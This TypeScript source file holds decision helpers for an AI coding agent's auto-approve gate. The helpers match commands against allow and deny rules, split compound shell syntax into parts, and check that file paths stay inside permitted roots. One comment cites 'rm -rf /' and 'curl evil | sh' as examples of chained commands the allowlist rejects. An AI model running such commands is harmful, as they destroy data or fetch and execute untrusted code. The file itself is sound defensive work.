/**
 * Pure decision helpers for auto-approve. No I/O, no side effects — unit-testable.
 */

import { isAbsolute, parse, relative, resolve, sep } from "node:path";
import type { ContextRule, Matcher } from "./config.ts";

/**
 * Shell metacharacters that enable command chaining, substitution, expansion, or
 * redirection. Presence of any of these makes a bash command ineligible for a
 * plain allowlist match (unless the matcher opts in via allowShellOperators).
 *
 * This is deliberately conservative: `git status` is allowlistable, but
 * `git status; rm -rf /` or `git status && curl evil | sh` is not.
 */
const SHELL_OPERATOR_RE = /[;&|`<>]|\$\(|\$\{|\n|\r/;

export function hasShellOperators(command: string): boolean {
	return SHELL_OPERATOR_RE.test(command);
}

export interface MatchInput {
	tool: string;
	/** The primary subject to match a pattern against (bash command, or file path). */
	subject: string;
	/** Raw tool input, used to build a stable signature. */
	raw: Record<string, unknown>;
}

export function buildMatchInput(toolName: string, input: Record<string, unknown>): MatchInput {
	let subject: string;
	if (toolName === "bash") {
		subject = typeof input.command === "string" ? input.command : "";
	} else if (typeof input.path === "string") {
		subject = input.path;
	} else {
		subject = JSON.stringify(input ?? {});
	}
	return { tool: toolName, subject, raw: input ?? {} };
}

/** Stable signature for session-scoped memoization / "always allow" decisions. */
export function signatureOf(input: Pick<MatchInput, "tool" | "subject">): string {
	return `${input.tool}\u0000${input.subject}`;
}

function canonicalJson(value: unknown, seen: Set<object>): string {
	if (value === null) return "null";
	if (typeof value === "string" || typeof value === "boolean") return JSON.stringify(value);
	if (typeof value === "number" && Number.isFinite(value)) return JSON.stringify(value);
	if (typeof value !== "object" || seen.has(value)) throw new TypeError("value is not JSON-serializable");

	seen.add(value);
	let result: string;
	if (Array.isArray(value)) {
		result = `[${value.map((item) => canonicalJson(item, seen)).join(",")}]`;
	} else {
		const entries = Object.keys(value as Record<string, unknown>)
			.sort()
			.map((key) => `${JSON.stringify(key)}:${canonicalJson((value as Record<string, unknown>)[key], seen)}`);
		result = `{${entries.join(",")}}`;
	}
	seen.delete(value);
	return result;
}

/** Exact, order-independent identity for a tool call approval. */
export function exactCallSignature(tool: string, input: Record<string, unknown>, cwd: string): string | undefined {
	try {
		return `${cwd}\u0000${tool}\u0000${canonicalJson(input, new Set())}`;
	} catch {
		return undefined;
	}
}

function safeRegExp(pattern: string): RegExp | undefined {
	try {
		return new RegExp(pattern);
	} catch {
		return undefined;
	}
}

type ShellQuote = "'" | '"' | "$'";

function stripLeadingAssignments(part: string): string {
	let start = 0;
	while (start < part.length) {
		while (/\s/.test(part[start] ?? "")) start++;
		const rest = part.slice(start);
		if (!/^[A-Za-z_][A-Za-z0-9_]*=/.test(rest)) break;

		let quote: ShellQuote | undefined;
		let escaped = false;
		let end = start;
		for (; end < part.length; end++) {
			const char = part[end]!;
			if (escaped) {
				escaped = false;
				continue;
			}
			if (char === "\\" && quote !== "'") {
				escaped = true;
				continue;
			}
			if (quote) {
				if (char === "'" && (quote === "'" || quote === "$'")) quote = undefined;
				else if (char === quote) quote = undefined;
				continue;
			}
			if (char === "$" && part[end + 1] === "'") {
				quote = "$'";
				end++;
			} else if (char === "'" || char === '"') quote = char;
			else if (/\s/.test(char)) break;
		}
		start = end;
	}
	return part.slice(start).trim();
}

function normalizeBashPart(part: string): string {
	let normalized = part.trim();
	while (normalized) {
		const previous = normalized;
		normalized = normalized.replace(/^function\s+[A-Za-z_][A-Za-z0-9_]*(?:\s*\(\s*\))?\s*\{\s*/, "");
		normalized = normalized.replace(/^(?:\{|!|if\b|then\b|elif\b|else\b|while\b|until\b|do\b)\s*/, "");
		normalized = stripLeadingAssignments(normalized);
		if (normalized === previous) break;
	}
	return normalized;
}

/**
 * Extracts approximate commands from compound shell syntax for advisory context
 * and deny matching. This deliberately is not used to grant allow-list access.
 */
function bashCommandParts(command: string): string[] {
	const parts: string[] = [];
	const contexts: Array<{ close: ")" | "`"; outerQuote: ShellQuote | undefined }> = [];
	let quote: ShellQuote | undefined;
	let escaped = false;
	let current = "";

	const finish = () => {
		const part = normalizeBashPart(current);
		if (part) parts.push(part);
		current = "";
	};

	for (let index = 0; index < command.length; index++) {
		const char = command[index]!;
		const next = command[index + 1];

		if (escaped) {
			current += char;
			escaped = false;
			continue;
		}
		if (char === "\\" && quote !== "'") {
			current += char;
			escaped = true;
			continue;
		}
		if (quote === "'" || quote === "$'") {
			current += char;
			if (char === "'") quote = undefined;
			continue;
		}
		if (!quote && char === "$" && next === "'") {
			current += "$'";
			quote = "$'";
			index++;
			continue;
		}
		if (char === "$" && next === "(") {
			finish();
			contexts.push({ close: ")", outerQuote: quote });
			quote = undefined;
			index++;
			continue;
		}
		if (char === "`") {
			if (!quote && contexts.at(-1)?.close === "`") {
				finish();
				quote = contexts.pop()!.outerQuote;
			} else {
				finish();
				contexts.push({ close: "`", outerQuote: quote });
				quote = undefined;
			}
			continue;
		}
		if (quote === '"') {
			current += char;
			if (char === '"') quote = undefined;
			continue;
		}
		if (char === "'") {
			quote = "'";
			current += char;
			continue;
		}
		if (char === '"') {
			quote = '"';
			current += char;
			continue;
		}
		if (char === "(") {
			finish();
			contexts.push({ close: ")", outerQuote: undefined });
			continue;
		}
		if (char === ")") {
			finish();
			if (contexts.at(-1)?.close === ")") quote = contexts.pop()!.outerQuote;
			continue;
		}
		if (char === ";" || char === "&" || char === "|" || char === "\n" || char === "\r") {
			finish();
			if ((char === "&" || char === "|") && next === char) index++;
			continue;
		}
		current += char;
	}

	if (quote || contexts.length > 0) return [];
	finish();
	return parts;
}

function matcherPatternApplies(
	m: Pick<Matcher, "tool" | "pattern">,
	input: MatchInput,
	matchBashParts = false,
): boolean {
	if (m.tool !== "*" && m.tool !== input.tool) return false;
	// bash matchers must specify a pattern; a bare tool match is too broad.
	if (input.tool === "bash" && !m.pattern) return false;
	if (!m.pattern) return true;
	const re = safeRegExp(m.pattern);
	if (!re) return false;
	if (re.test(input.subject)) return true;
	return matchBashParts && input.tool === "bash" && bashCommandParts(input.subject).some((part) => re.test(part));
}

function matcherApplies(m: Matcher, input: MatchInput): boolean {
	if (!matcherPatternApplies(m, input)) return false;
	// Bash allow rules reject operators unless explicitly opted in.
	return input.tool !== "bash" || !!m.allowShellOperators || !hasShellOperators(input.subject);
}

export function matchesAny(list: Matcher[], input: MatchInput): boolean {
	return list.some((m) => matcherApplies(m, input));
}

/** Deny rules match dangerous commands even when shell operators are present. */
export function matchesAnyDeny(list: Matcher[], input: MatchInput): boolean {
	return list.some((m) => matcherPatternApplies(m, input, true));
}

/** Instructions from every context rule matching this tool call, in config order. */
export function matchingInstructions(list: ContextRule[], input: MatchInput): string[] {
	return list.filter((rule) => matcherPatternApplies(rule, input, true)).map((rule) => rule.instructions);
}

function expandHomePath(path: string, homeDir?: string): string {
	if (!homeDir) return path;
	if (path === "~") return homeDir;
	if (path.startsWith("~/")) return resolve(homeDir, path.slice(2));
	return path;
}

/**
 * Absolute path a tool opens for `targetPath`, resolved lexically, or undefined
 * for an empty path. Tool-path `@` prefixes and `~` are expanded.
 */
export function absoluteToolPath(targetPath: string, executionCwd: string, homeDir?: string): string | undefined {
	if (typeof targetPath !== "string") return undefined;
	const path = expandHomePath(targetPath.startsWith("@") ? targetPath.slice(1) : targetPath, homeDir);
	if (path.length === 0) return undefined;
	return isAbsolute(path) ? resolve(path) : resolve(executionCwd, path);
}

/** True for read calls resolved within Pi's global skills directory. */
export function isAgentSkillRead(input: MatchInput, agentDir: string, executionCwd: string, homeDir: string): boolean {
	if (input.tool !== "read") return false;
	return isPathWithinRoots(input.subject, resolve(agentDir, "skills"), [], executionCwd, homeDir);
}

/** True if a tool path lexically resolves to a `.git` or `.hg` path. */
export function isVersionControlMetadataPath(targetPath: string, executionCwd: string, homeDir?: string): boolean {
	const abs = absoluteToolPath(targetPath, executionCwd, homeDir);
	if (abs === undefined) return false;
	return relative(parse(abs).root, abs)
		.split(sep)
		.some((component) => component === ".git" || component === ".hg");
}

function resolveRoot(root: string, base: string, homeDir?: string): string {
	const expanded = expandHomePath(root, homeDir);
	return isAbsolute(expanded) ? resolve(expanded) : resolve(base, expanded);
}

function contains(root: string, abs: string): boolean {
	const rel = relative(root, abs);
	return rel === "" || (!rel.startsWith("..") && !isAbsolute(rel));
}

/**
 * True if `targetPath` resolves inside cwd or any of `roots`.
 * Relative targets resolve against executionCwd; relative roots resolve against
 * cwd. Tool-path `@` prefixes and `~` are expanded. Containment is checked
 * lexically and, given `realPath`, also between the symlink-resolved target and
 * roots; an unresolvable target is out of scope.
 */
export function isPathWithinRoots(
	targetPath: string,
	cwd: string,
	roots: string[],
	executionCwd = cwd,
	homeDir?: string,
	realPath?: (abs: string) => string | undefined,
): boolean {
	const abs = absoluteToolPath(targetPath, executionCwd, homeDir);
	if (abs === undefined) return false;
	const absRoots = [cwd, ...roots].map((root) => resolveRoot(root, cwd, homeDir));
	if (!absRoots.some((root) => contains(root, abs))) return false;
	if (!realPath) return true;
	const real = realPath(abs);
	if (real === undefined) return false;
	return absRoots.some((root) => {
		const realRoot = realPath(root);
		return realRoot !== undefined && contains(realRoot, real);
	});
}

/**
 * Trusted evaluator instruction naming the automatic path scope, or undefined
 * when that scope is only the working directory. Relative configured roots
 * resolve against cwd, as in the gate.
 */
export function scopeInstruction(
	cwd: string,
	writeRoots: string[],
	readRoots: string[],
	homeDir: string,
): string | undefined {
	const scope = resolve(cwd);
	const writable = [...new Set([scope, ...writeRoots.map((root) => resolveRoot(root, scope, homeDir))])];
	const readOnly = [...new Set(readRoots.map((root) => resolveRoot(root, scope, homeDir)))].filter(
		(root) => !writable.some((writableRoot) => contains(writableRoot, root)),
	);
	if (writable.length === 1 && readOnly.length === 0) return undefined;
	return [
		`Path scope. Writable roots: ${writable.join(", ")}.`,
		...(readOnly.length > 0 ? [`Read-only roots: ${readOnly.join(", ")}.`] : []),
		`\`~\` is ${homeDir}.`,
		"Treat read-only inspection anywhere in these roots (reading, listing, searching, counting, diffing, read-only git) like inspection of the working project.",
		"Writes, deletions, and other local file or repository mutations are routine only within writable roots or standard temporary directories; request review for them elsewhere.",
	].join(" ");
}
